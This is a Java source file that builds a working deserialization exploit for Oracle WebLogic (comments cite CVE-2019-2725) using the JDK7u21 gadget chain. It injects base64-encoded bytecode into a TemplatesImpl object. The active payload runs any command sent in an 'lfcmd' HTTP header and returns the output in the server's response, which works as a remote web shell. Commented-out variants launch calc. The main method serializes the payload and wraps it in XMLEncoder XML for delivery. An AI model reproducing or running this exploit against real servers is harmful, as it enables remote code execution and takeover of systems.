package JDK7u21;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.io.FileUtils;
import weblogic.servlet.internal.ServletOutputStreamImpl;
import weblogic.servlet.internal.ServletResponseImpl;
import weblogic.xml.util.StringInputStream;

import javax.xml.transform.Templates;
import java.beans.XMLEncoder;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.LinkedHashSet;


class Reflections {

    public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
        Field field = clazz.getDeclaredField(fieldName);
        if (field != null)
            field.setAccessible(true);
        else if (clazz.getSuperclass() != null)
            field = getField(clazz.getSuperclass(), fieldName);
        return field;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        return ctor;
    }
}

class ClassFiles {
    public static String classAsFile(final Class<?> clazz) {
        return classAsFile(clazz, true);
    }

    public static String classAsFile(final Class<?> clazz, boolean suffix) {
        String str;
        if (clazz.getEnclosingClass() == null) {
            str = clazz.getName().replace(".", "/");
        } else {
            str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
        }
        if (suffix) {
            str += ".class";
        }
        return str;
    }

    public static byte[] classAsBytes(final Class<?> clazz) {
        try {
            final byte[] buffer = new byte[1024];
            final String file = classAsFile(clazz);
            final InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(file);
            if (in == null) {
                throw new IOException("couldn't find '" + file + "'");
            }
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }
            return out.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

}

class Gadgets {
    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
        private static final long serialVersionUID = -5971610431559700674L;

        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?> ... ifaces) {
        final Class<?>[] allIfaces
                = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(
                Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces , ih));
    }

    public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
        final TemplatesImpl templates = new TemplatesImpl();

        // use template gadget class

        // 获取容器ClassPool，注入classpath
        ClassPool pool = ClassPool.getDefault();
        System.out.println("insertClassPath: " + new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));

        // 获取已经编译好的类
        System.out.println("ClassName: " + StubTransletPayload.class.getName());
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());

//        // 在静态的的构造方法中插入payload
//        clazz.makeClassInitializer()
//                .insertAfter("java.lang.Runtime.getRuntime().exec(\""
//                        + command.replaceAll("\"", "\\\"")
//                        + "\");");


//        // 在静态的的构造方法中插入payload
//        clazz.makeClassInitializer()
//                .insertAfter("String R = \"yv66vgAAADIAfgoAGgBIBwBJCgACAEoHAEsKAAQATAoAAgBNCgAEAE4KAAIATwoABABQCgBRAFIKAFEAUwoAVABVCgAZAFYKAFQAVwoAVABYBwBZBwBaCgARAEgIAFsKABEAXAcAXQoAFQBeCgARAF8KABAAYAcAYQcAYgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTEVycm9yQmFzZUV4ZWM7AQAJcmVhZEJ5dGVzAQAZKExqYXZhL2lvL0lucHV0U3RyZWFtOylbQgEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFYnVmaW4BAB1MamF2YS9pby9CdWZmZXJlZElucHV0U3RyZWFtOwEACGJ1ZmZTaXplAQABSQEAA291dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAR0ZW1wAQACW0IBAARzaXplAQAHY29udGVudAEADVN0YWNrTWFwVGFibGUHAGMHAEkHAEsHAC0BAApFeGNlcHRpb25zBwBkAQAHZG9fZXhlYwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAGc3Rkb3V0AQAJZXhpdFZhbHVlBwBdBwBlAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBACdFcnJvckJhc2VFeGVjLmphdmEgZnJvbSBJbnB1dEZpbGVPYmplY3QMABsAHAEAG2phdmEvaW8vQnVmZmVyZWRJbnB1dFN0cmVhbQwAGwBmAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MABsAZwwAaABpDABqAGsMAGwAHAwAbQBuBwBvDABwAHEMAHIAcwcAZQwAdAB1DAAiACMMAHYAdQwAdwB4AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQATLS0tLS0tLS0tLS0tLS0tLS0NCgwAeQB6AQAQamF2YS9sYW5nL1N0cmluZwwAGwB7DAB8AH0MABsAOAEADUVycm9yQmFzZUV4ZWMBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUHJvY2VzcwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEABChJKVYBAARyZWFkAQAFKFtCKUkBAAV3cml0ZQEAByhbQklJKVYBAAVjbG9zZQEAC3RvQnl0ZUFycmF5AQAEKClbQgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRFcnJvclN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAOZ2V0SW5wdXRTdHJlYW0BAAd3YWl0Rm9yAQADKClJAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAFKFtCKVYBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7ACEAGQAaAAAAAAAEAAEAGwAcAAEAHQAAAC8AAQABAAAABSq3AAGxAAAAAgAeAAAABgABAAAABAAfAAAADAABAAAABQAgACEAAAAJACIAIwACAB0AAADsAAQABwAAAES7AAJZKrcAA0wRBAA9uwAEWRy3AAVOHLwIOgQDNgUrGQS2AAZZNgUCnwAPLRkEAxUFtgAHp//qK7YACC22AAk6BhkGsAAAAAMAHgAAACoACgAAAAcACQAIAA0ACQAWAAoAGwALAB4ADQArAA4ANwARADsAEwBBABUAHwAAAEgABwAAAEQAJAAlAAAACQA7ACYAJwABAA0ANwAoACkAAgAWAC4AKgArAAMAGwApACwALQAEAB4AJgAuACkABQBBAAMALwAtAAYAMAAAABgAAv8AHgAGBwAxBwAyAQcAMwcANAEAABgANQAAAAQAAQA2AAkANwA4AAIAHQAAAPcABgAFAAAAcbgACiq2AAtMK7YADLgADU0rtgAOuAANTiu2AA82BBUEmgAquwAQWbsAEVm3ABISE7YAFLsAFVkttwAWtgAUEhO2ABS2ABe3ABi/uwAQWbsAEVm3ABISE7YAFLsAFVkstwAWtgAUEhO2ABS2ABe3ABi/AAAAAwAeAAAAHgAHAAAAGgAIABsAEAAcABgAHQAeAB8AIwAgAEoAIgAfAAAANAAFAAAAcQA5ADoAAAAIAGkAOwA8AAEAEABhAD0ALQACABgAWQA+AC0AAwAeAFMAPwApAAQAMAAAABYAAf8ASgAFBwBABwBBBwA0BwA0AQAAADUAAAAEAAEAEAAJAEIAQwACAB0AAAArAAAAAQAAAAGxAAAAAgAeAAAABgABAAAAOQAfAAAADAABAAAAAQBEAEUAAAA1AAAABAABABAAAQBGAAAAAgBH\";"
//                        + "sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();"
//                        + "byte[] bt = decoder.decodeBuffer(R);"
//                        + "org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();"
//                        + "Class cl = cls.defineClass(\"ErrorBaseExec\",bt);"
//                        + "java.lang.reflect.Method m = cl.getMethod(\"do_exec\",new Class[]{String.class});"
//                        + "m.invoke(cl.newInstance(),new Object[]{\"calc\"});"
//                        + "");

//                // 在静态的的构造方法中插入payload
//        clazz.makeClassInitializer()
//                .insertAfter("String R = \"yv66vgAAADIAfgoAGgBIBwBJCgACAEoHAEsKAAQATAoAAgBNCgAEAE4KAAIATwoABABQCgBRAFIKAFEAUwoAVABVCgAZAFYKAFQAVwoAVABYBwBZBwBaCgARAEgIAFsKABEAXAcAXQoAFQBeCgARAF8KABAAYAcAYQcAYgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTEVycm9yQmFzZUV4ZWM7AQAJcmVhZEJ5dGVzAQAZKExqYXZhL2lvL0lucHV0U3RyZWFtOylbQgEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFYnVmaW4BAB1MamF2YS9pby9CdWZmZXJlZElucHV0U3RyZWFtOwEACGJ1ZmZTaXplAQABSQEAA291dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAR0ZW1wAQACW0IBAARzaXplAQAHY29udGVudAEADVN0YWNrTWFwVGFibGUHAGMHAEkHAEsHAC0BAApFeGNlcHRpb25zBwBkAQAHZG9fZXhlYwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAXABABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAGc3Rkb3V0AQAJZXhpdFZhbHVlBwBdBwBlAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBACdFcnJvckJhc2VFeGVjLmphdmEgZnJvbSBJbnB1dEZpbGVPYmplY3QMABsAHAEAG2phdmEvaW8vQnVmZmVyZWRJbnB1dFN0cmVhbQwAGwBmAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MABsAZwwAaABpDABqAGsMAGwAHAwAbQBuBwBvDABwAHEMAHIAcwcAZQwAdAB1DAAiACMMAHYAdQwAdwB4AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQATLS0tLS0tLS0tLS0tLS0tLS0NCgwAeQB6AQAQamF2YS9sYW5nL1N0cmluZwwAGwB7DAB8AH0MABsAOAEADUVycm9yQmFzZUV4ZWMBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9JbnB1dFN0cmVhbQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUHJvY2VzcwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEABChJKVYBAARyZWFkAQAFKFtCKUkBAAV3cml0ZQEAByhbQklJKVYBAAVjbG9zZQEAC3RvQnl0ZUFycmF5AQAEKClbQgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRFcnJvclN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAOZ2V0SW5wdXRTdHJlYW0BAAd3YWl0Rm9yAQADKClJAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAFKFtCKVYBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7ACEAGQAaAAAAAAAEAAEAGwAcAAEAHQAAAC8AAQABAAAABSq3AAGxAAAAAgAeAAAABgABAAAABAAfAAAADAABAAAABQAgACEAAAAJACIAIwACAB0AAADsAAQABwAAAES7AAJZKrcAA0wRBAA9uwAEWRy3AAVOHLwIOgQDNgUrGQS2AAZZNgUCnwAPLRkEAxUFtgAHp//qK7YACC22AAk6BhkGsAAAAAMAHgAAACoACgAAAAcACQAIAA0ACQAWAAoAGwALAB4ADQArAA4ANwARADsAEwBBABUAHwAAAEgABwAAAEQAJAAlAAAACQA7ACYAJwABAA0ANwAoACkAAgAWAC4AKgArAAMAGwApACwALQAEAB4AJgAuACkABQBBAAMALwAtAAYAMAAAABgAAv8AHgAGBwAxBwAyAQcAMwcANAEAABgANQAAAAQAAQA2AAkANwA4AAIAHQAAAPcABgAFAAAAcbgACiq2AAtMK7YADLgADU0rtgAOuAANTiu2AA82BBUEmgAquwAQWbsAEVm3ABISE7YAFLsAFVkttwAWtgAUEhO2ABS2ABe3ABi/uwAQWbsAEVm3ABISE7YAFLsAFVkstwAWtgAUEhO2ABS2ABe3ABi/AAAAAwAeAAAAHgAHAAAAGgAIABsAEAAcABgAHQAeAB8AIwAgAEoAIgAfAAAANAAFAAAAcQA5ADoAAAAIAGkAOwA8AAEAEABhAD0ALQACABgAWQA+AC0AAwAeAFMAPwApAAQAMAAAABYAAf8ASgAFBwBABwBBBwA0BwA0AQAAADUAAAAEAAEAEAAJAEIAQwACAB0AAAArAAAAAQAAAAGxAAAAAgAeAAAABgABAAAAOQAfAAAADAABAAAAAQBEAEUAAAA1AAAABAABABAAAQBGAAAAAgBH\";"
//                        + "sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();"
//                        + "byte[] bt = decoder.decodeBuffer(R);"
//                        + "org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();"
//                        + "Class cl = cls.defineClass(\"ErrorBaseExec\",bt);"
//                        + "cl.newInstance().getClass().getMethod(\"do_exec\", new Class[]{String.class}).invoke(cl.newInstance(),new Object[]{\"calc\"});"
//                        + "");

//        // getWriter返回1111111111
//        clazz.makeClassInitializer()
//                .insertAfter(""
//                        + "((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse().getWriter().write(\"test webloigc cve_2019_2725\");"
//                        + "");

//        // getServletOutputStream返回xxxxxxxxxxx
//        clazz.makeClassInitializer()
//                .insertAfter(""
//                        + "weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n"
//                        + "weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n"
//                        + "outputStream.writeStream(new weblogic.xml.util.StringInputStream(\"test webloigc cve_2019_2725\"));\n"
//                        + "outputStream.flush();\n"
//                        + "");

//        // 接受headers返回lfcmd
//        clazz.makeClassInitializer()
//                .insertAfter(""
//                        + "String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\"lfcmd\");\n"
//                        + "weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n"
//                        + "weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n"
//                        + "outputStream.writeStream(new weblogic.xml.util.StringInputStream(lfcmd));\n"
//                        + "outputStream.flush();\n"
//                        + "response.getWriter().write(\"\");"
//                        + "");

        // 返回执行命令
        clazz.makeClassInitializer()
                .insertAfter(""
                        + "String ua = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(\"lfcmd\");\n"
                        + "String R = \"yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7\";"
                        + "sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();"
                        + "byte[] bt = decoder.decodeBuffer(R);"
                        + "org.mozilla.classfile.DefiningClassLoader cls = new org.mozilla.classfile.DefiningClassLoader();"
                        + "Class cl = cls.defineClass(\"ResultBaseExec\",bt);"
                        + "java.lang.reflect.Method m = cl.getMethod(\"do_exec\",new Class[]{String.class});"
                        + "Object object = m.invoke(cl.newInstance(),new Object[]{ua});"
                        + "weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();\n"
                        + "weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();\n"
                        + "outputStream.writeStream(new weblogic.xml.util.StringInputStream(object.toString()));\n"
                        + "outputStream.flush();\n"
                        + "response.getWriter().write(\"\");"
                        + "");



        // 给payload类设置一个名称
        // unique name to allow repeated execution (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());

        // 获取该类的字节码
        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(
                templates,
                "_bytecodes",
                new byte[][] {
                        classBytes,
                        ClassFiles.classAsBytes(Foo.class)
                });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 只要触发这个方法就能执行我们注入的bytecodes
        // templates.getOutputProperties();
        return templates;
    }
}



public class JDK7u21 {

    public Object buildPayload(final String command) throws Exception {
        // generate evil templates，if we trigger templates.getOutputProperties(), we can execute command
        Object templates = Gadgets.createTemplatesImpl(command);

        // magic string, zeroHashCodeStr.hashCode() == 0
        String zeroHashCodeStr = "f5a5a608";

        // build a hash map, and put our evil templates in it.
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");  // Not necessary

        // Generate proxy's handler，use `AnnotationInvocationHandler` as proxy's handler
        // When proxy is done，all call proxy.anyMethod() will be dispatch to AnnotationInvocationHandler's invoke method.
        Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);
//        Reflections.setFieldValue(tempHandler, "type", Templates.class);  // not necessary, because newInstance() already pass Templates.class to tempHandler
        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);     // save evil templates
        set.add(proxy);         // proxy

        map.put(zeroHashCodeStr, templates);

        return set;
    }

    public static void main(String[] args) throws Exception {
        JDK7u21 exploit = new JDK7u21();
        Object payload = exploit.buildPayload("calc");

        // test payload
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("d:/calc.bin"));
        oos.writeObject(payload);
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("d:/calc.bin"));
        ois.readObject();

        byte[] payload_byte = FileUtils.readFileToByteArray(new File("d:/calc.bin"));
        XMLEncoder encoder = new XMLEncoder(new BufferedOutputStream(new FileOutputStream("d:/calc.xml")));
        encoder.writeObject(payload_byte);
        encoder.close();
    }

}
